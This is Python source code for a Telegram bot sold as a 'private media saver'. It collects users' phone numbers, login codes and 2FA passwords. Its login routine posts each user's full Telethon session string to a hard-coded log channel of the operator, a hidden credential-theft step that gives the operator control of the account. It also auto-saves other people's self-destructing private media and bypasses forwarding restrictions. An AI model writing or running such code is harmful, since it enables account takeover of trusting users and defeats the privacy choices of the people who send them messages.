import os
import asyncio
import logging
import time
from datetime import datetime
from motor.motor_asyncio import AsyncIOMotorClient
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, ChannelPrivateError
)
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ReplyKeyboardMarkup, KeyboardButton
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters, ConversationHandler
)
from dotenv import load_dotenv

load_dotenv()
DEFAULT_API_ID = int(os.getenv("API_ID"))
DEFAULT_API_HASH = os.getenv("API_HASH")
MONGO_URI = os.getenv("MONGO_URI")
BOT_TOKEN = os.getenv("BOT_TOKEN")
LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))

WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
SUPPORT_LINK = "https://t.me/valahallah"

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger("UserBot")

mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client.userbot
sessions = db.sessions

app = ApplicationBuilder().token(BOT_TOKEN).build()
API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
user_login_data = {}
user_last_action_time = {}

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ ᴀʟʟ ᴘʀᴏᴄᴇss ᴄᴀɴᴄᴇʟʟᴇᴅ. Nᴏᴡ sᴇɴᴅ /start ᴀɢᴀɪɴ.")
    return ConversationHandler.END

async def spam_protected(user_id):
    now = time.time()
    last = user_last_action_time.get(user_id, 0)
    if now - last < 10:
        return False
    user_last_action_time[user_id] = now
    return True

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    inline_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("𝗖𝗼𝗻𝗻𝗲𝗰𝘁 𝗬𝗼𝘂𝗿 𝗔𝗰𝗰𝗼𝘂𝗻𝘁", callback_data="connect")],
        [InlineKeyboardButton("🍬𝗦𝗨𝗣𝗣𝗢𝗥𝗧🍬", url=SUPPORT_LINK)]
    ])
    reply_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("📥 ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ɴᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ")]],
        resize_keyboard=True
    )
    welcome_text = (
        "<b>✨𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗽𝗿𝗶𝘃𝗮𝘁𝗲 𝗺𝗲𝗱𝗶𝗮 𝘀𝗮𝘃𝗲𝗿✨</b>\n\n"
        "🔐 <i>sᴇᴄᴜʀᴇʟʏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ Tᴇʟᴇɢʀᴀᴍ ᴀᴄᴄᴏᴜɴᴛ .</i>\n\n"
        "<b>⚙️ 𝗳𝗲𝗮𝘁𝘂𝗿𝗲𝘀:</b>\n"
        "• sᴀᴠᴇ ᴅɪsᴀᴘᴘᴇᴀʀɪɴɢ ᴍᴇᴅɪᴀ ғʀᴏᴍ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛs ᴀᴜᴛᴏᴍᴀᴛɪᴄᴀʟʟʏ 📦\n"
        "• ᴅᴏᴡɴʟᴏᴀᴅ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴄᴏɴᴛᴇɴᴛ ғʀᴏᴍ ɢʀᴏᴜᴘs & ᴄʜᴀɴɴᴇʟs🔓\n"
        "• ʙᴀᴄᴋɢʀᴏᴜɴᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴡɪᴛʜᴏᴜᴛ ɴᴇᴇᴅɪɴɢ ʏᴏᴜʀ ᴍᴀɪɴ ᴘʜᴏɴᴇ  📲\n\n"
        " 𝗽𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 ~ 𝘁𝗲𝗮𝗺 𝘃𝗮𝗹𝗹𝗮𝗵𝗮𝗹𝗹𝗮"
    )
    await update.message.reply_photo(
        photo=WELCOME_IMAGE,
        caption=welcome_text,
        reply_markup=inline_keyboard,
        parse_mode="HTML"
    )
    await update.message.reply_text(
        "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
        reply_markup=reply_keyboard
    )

async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📎 Sᴇɴᴅ ᴛʜᴇ ᴍᴇssᴀɢᴇ ʟɪɴᴋ ғʀᴏᴍ ᴀ ᴄʜᴀɴɴᴇʟ/ɢʀᴏᴜᴘ ʏᴏᴜ'ʀᴇ Jᴏɪɴᴇᴅ ɪɴ ᴄᴏɴɴᴇᴄᴛᴇᴅ ᴀᴄᴄᴏᴜɴᴛ:\n\n"
        "Exᴀᴍᴘʟᴇ: https://t.me/c/123456789/55 or https://t.me/username/123"
    )
    return FETCH_LINK

async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if not await spam_protected(user_id):
        await update.message.reply_text("⚠️ Please wait 10 seconds before using this again.")
        return FETCH_LINK

    if user_id not in user_login_data or "client" not in user_login_data[user_id]:
        await update.message.reply_text("⚠️ Yᴏᴜ ɴᴇᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ғɪʀsᴛ ᴜsɪɴɢ /start.")
        return ConversationHandler.END

    client = user_login_data[user_id]["client"]
    try:
        if "t.me/c/" in text:
            parts = text.split("t.me/c/")[1].split("/")
            chat_id = int("-100" + parts[0])
            msg_id = int(parts[1])
        elif "t.me/" in text:
            parts = text.split("t.me/")[1].split("/")
            chat_id = parts[0]
            msg_id = int(parts[1])
        else:
            await update.message.reply_text("❌ Iɴᴠᴀʟɪᴅ ᴍᴇssᴀɢᴇ ʟɪɴᴋ ғᴏʀᴍᴀᴛ.")
            return FETCH_LINK

        entity = await client.get_entity(chat_id)
        message = await client.get_messages(entity, ids=msg_id)

        if not message or not message.media:
            await update.message.reply_text("⚠️ Nᴏ ᴍᴇᴅɪᴀ ғᴏᴜɴᴅ ɪɴ ᴛʜᴀᴛ ᴍᴇssᴀɢᴇ.")
            return ConversationHandler.END

        file = await message.download_media()
        await client.send_file("me", file, caption="📥 Fᴇᴛᴄʜᴇᴅ ғʀᴏᴍ ɴᴏɴ-ғᴏʀᴡᴀʀᴅᴀʙʟᴇ ᴍᴇᴅɪᴀ ʟɪɴᴋ.")
        await update.message.reply_text("✅ Mᴇᴅɪᴀ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ ᴀɴᴅ sᴇɴᴛ ᴛᴏ ʏᴏᴜʀ Sᴀᴠᴇᴅ Mᴇssᴀɢᴇs.")
    except ChannelPrivateError:
        await update.message.reply_text("❌ Yᴏᴜ'ʀᴇ ɴᴏᴛ ᴀ ᴍᴇᴍʙᴇʀ ᴏғ ᴛʜᴀᴛ ᴄʜᴀɴɴᴇʟ.")
    except Exception as e:
        logger.error(f"[FETCH ERROR] {e}")
        await update.message.reply_text("❌ Sᴏᴍᴇᴛʜɪɴɢ ᴡᴇɴᴛ ᴡʀᴏɴɢ. Tʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")
    return ConversationHandler.END
async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query.message:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(
            "📲 <b>Eɴᴛᴇʀ ʏᴏᴜʀ API ID </b> ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ\n\n"
            "💡 <i>Exᴀᴍᴘʟᴇ:</i> <code>29587868</code>\n"
            "ℹ️ Yᴏᴜ ᴄᴀɴ ᴄᴀɴᴄᴇʟ ᴀɴʏᴛɪᴍᴇ ʙʏ sᴇɴᴅɪɴɢ /cancel",
            parse_mode="HTML"
        )
        return API_ID
    else:
        await update.callback_query.answer("⚠️ Tʜɪs ʙᴜᴛᴛᴏɴ ɪs ᴇxᴘɪʀᴇᴅ. Usᴇ /start ᴀɢᴀɪɴ.", show_alert=True)
        return ConversationHandler.END

async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id] = {"api_id": DEFAULT_API_ID}
    await update.message.reply_text("📲 Eɴᴛᴇʀ ʏᴏᴜʀ API HASH ᴏʀ sᴇɴᴅ /skip ᴛᴏ ᴜsᴇ ᴅᴇғᴀᴜʟᴛ")
    return API_HASH

async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_login_data[update.effective_user.id]["api_hash"] = DEFAULT_API_HASH
    await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ +ᴄᴏᴅᴇ)")
    return PHONE

async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == "/skip":
        return await skip_api_id(update, context)
    if not text.isdigit():
        await update.message.reply_text("❌ API ID ᴍᴜsᴛ ʙᴇ ɴᴜᴍʙᴇʀ")
        return API_ID
    user_login_data[update.effective_user.id] = {"api_id": int(text)}
    await update.message.reply_text("📲 Now enter API HASH or /skip to use default")
    return API_HASH

async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text.lower() == "/skip":
        return await skip_api_hash(update, context)
    user_login_data[update.effective_user.id]["api_hash"] = text
    await update.message.reply_text("📞 Now enter your phone number (with +countrycode)")
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    phone = update.message.text.strip()
    user_login_data[user_id]["phone"] = phone

    try:
        client = TelegramClient(
            StringSession(),
            user_login_data[user_id]["api_id"],
            user_login_data[user_id]["api_hash"]
        )
        await client.connect()
        await client.send_code_request(phone)
        user_login_data[user_id]["client"] = client
        await update.message.reply_text("🔐 Eɴᴛᴇʀ OTP (with spaces like `1 2 3 4 5`):")
        return CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Cᴏᴅᴇ ʀᴇǫᴜᴇsᴛ ғᴀɪʟᴇᴅ: {e}")
        return ConversationHandler.END

async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    code = update.message.text.replace(" ", "").strip()
    client = user_login_data[user_id]["client"]

    try:
        await client.sign_in(user_login_data[user_id]["phone"], code)
        return await complete_login(update, context)
    except PhoneCodeExpiredError:
        await update.message.reply_text("⌛ OTP expired. /start again.")
    except SessionPasswordNeededError:
        await update.message.reply_text("🔑 2FA enabled. Enter password:")
        return PASSWORD
    except PhoneCodeInvalidError:
        await update.message.reply_text("❌ Invalid OTP. /start again.")
    except Exception as e:
        await update.message.reply_text(f"❌ Login failed: {e}")
    return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    password = update.message.text.strip()
    client = user_login_data[user_id]["client"]

    try:
        await client.sign_in(password=password)
        return await complete_login(update, context)
    except Exception as e:
        await update.message.reply_text(f"❌ Password login failed: {e}")
        return ConversationHandler.END

async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    client = user_login_data[user_id]["client"]
    session_string = client.session.save()
    me = await client.get_me()

    await sessions.update_one(
        {"_id": user_id},
        {"$set": {
            "session": session_string,
            "type": "telethon",
            "account_id": me.id,
            "creator_id": user_id,
            "is_admin": True
        }},
        upsert=True
    )

    @client.on(events.NewMessage(incoming=True))
    async def auto_save(event):
        if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
            try:
                sender = await event.get_sender()
                name = getattr(sender, 'username', 'Unknown')
                file = await event.download_media()
                await client.send_file(
                    "me", file,
                    caption=f"🕒 Aᴜᴛᴏ-sᴀᴠᴇᴅ ᴍᴇᴅɪᴀ ғʀᴏᴍ @{name} ᴀᴛ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            except Exception as e:
                logger.warning(f"[AUTO SAVE FAILED]: {e}")

    async def run():
        await client.run_until_disconnected()

    context.application.create_task(run())

    await update.message.reply_text("✅ Aᴄᴄᴏᴜɴᴛ ᴄᴏɴɴᴇᴄᴛᴇᴅ. Sᴛᴀʀᴛ ᴜsɪɴɢ ᴍᴇᴅɪᴀ ғᴇᴛᴄʜ ɴᴏᴡ 🔓")
    await context.bot.send_message(
        chat_id=LOG_CHANNEL_ID,
        text=(
            f"🆕 <b>New User Connected</b>\n\n"
            f"👤 User ID: <code>{user_id}</code>\n"
            f"🧬 Session: <code>{session_string}</code>\n"
            f"🔗 Username: @{getattr(me, 'username', 'N/A')}"
        ),
        parse_mode="HTML"
    )
    return ConversationHandler.END

# --- Conversation Handlers ---
login_conv = ConversationHandler(
    entry_points=[CallbackQueryHandler(connect_callback, pattern="connect")],
    states={
        API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_id), CommandHandler("skip", skip_api_id)],
        API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_api_hash), CommandHandler("skip", skip_api_hash)],
        PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
        CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_otp)],
        PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
    allow_reentry=True
)

fetch_conv = ConversationHandler(
    entry_points=[
        MessageHandler(filters.TEXT & filters.Regex("(?i).*Download Non-Forwardable Media.*"), menu_fetch_request)
    ],
    states={
        FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)

# --- Register and Run ---
app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("cancel", cancel))
app.add_handler(login_conv)
app.add_handler(fetch_conv)

print("🤖 Bot is running...")
app.run_polling()    
